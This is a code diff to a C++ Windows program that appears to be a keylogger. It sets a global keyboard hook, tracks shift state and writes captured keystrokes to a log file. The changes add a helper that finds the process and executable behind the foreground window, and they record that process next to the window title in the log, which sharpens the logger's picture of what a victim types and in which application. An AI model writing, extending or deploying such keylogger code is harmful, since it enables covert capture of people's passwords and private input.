@@ -4,6 +4,7 @@
 #include "stdafx.h"
 #include <Windows.h>
 #include <Shlobj.h>
+#include <psapi.h>
 
 #include "time.h"
 #include "string" 
@@ -17,7 +18,7 @@ HHOOK KeyboardHook;
 // Shift Key 
 bool shift = FALSE;
 // Windows Title Text -260 char-
-char cWindow[1000];
+CHAR cWindow[1000];
 // NULL is ok
 HWND lastWindow = NULL;
 // File Path
@@ -214,6 +215,38 @@ std::string Dayofweek(int code)
 	return name;
 }
 
+
+class My {
+public:
+	static void Debug(std::string string) {
+		string += "\n";
+
+		OutputDebugStringA(string.c_str());
+		std::cout << string.c_str();
+	}
+
+	static std::string GetWindowFileName(HWND hwnd) {
+		CHAR moduleName[2048] = { 0 };
+		DWORD dwProcId = 0;
+		GetWindowThreadProcessId(hwnd, &dwProcId);
+
+		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
+		GetModuleFileNameExA((HMODULE)hProc, NULL, moduleName, sizeof(moduleName) / sizeof(WCHAR));
+		CloseHandle(hProc);
+
+		Debug((std::string("moduleName = ") + moduleName).c_str());
+
+		return std::string("(") + std::to_string(dwProcId) + ") , " + moduleName;
+	}
+
+	static bool Test() {
+		GetWindowFileName(GetForegroundWindow());
+
+		//return true;
+		return false;
+	}
+};
+
 LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	/*
@@ -319,9 +352,16 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				  _In_  int    nMaxCount
 				);
 				*/
-				int c = GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
+
+				HWND hwnd = GetForegroundWindow();
+				int c = GetWindowTextA(hwnd, cWindow, sizeof(cWindow));
 				std::cout << c;
-				temp << " - Current Window: " << cWindow << "\n\n";
+
+				std::string moduleName = My::GetWindowFileName(hwnd);
+
+				temp << " - Current Window: " << cWindow << "\n";
+				temp << " - Current Process: " << moduleName << "\n\n";
+
 				//outPut.append(temp.str());
 				std::cout << temp.str() << std::endl;
 				myfile << temp.str() << std::endl;
@@ -356,6 +396,10 @@ int WinMain(
 	int       nShowCmd
 )
 {
+	if (My::Test()) {
+		return 0;
+	}
+
 	PWSTR pwstrAppData = NULL;
 
 	HRESULT hr = SHGetKnownFolderPath(
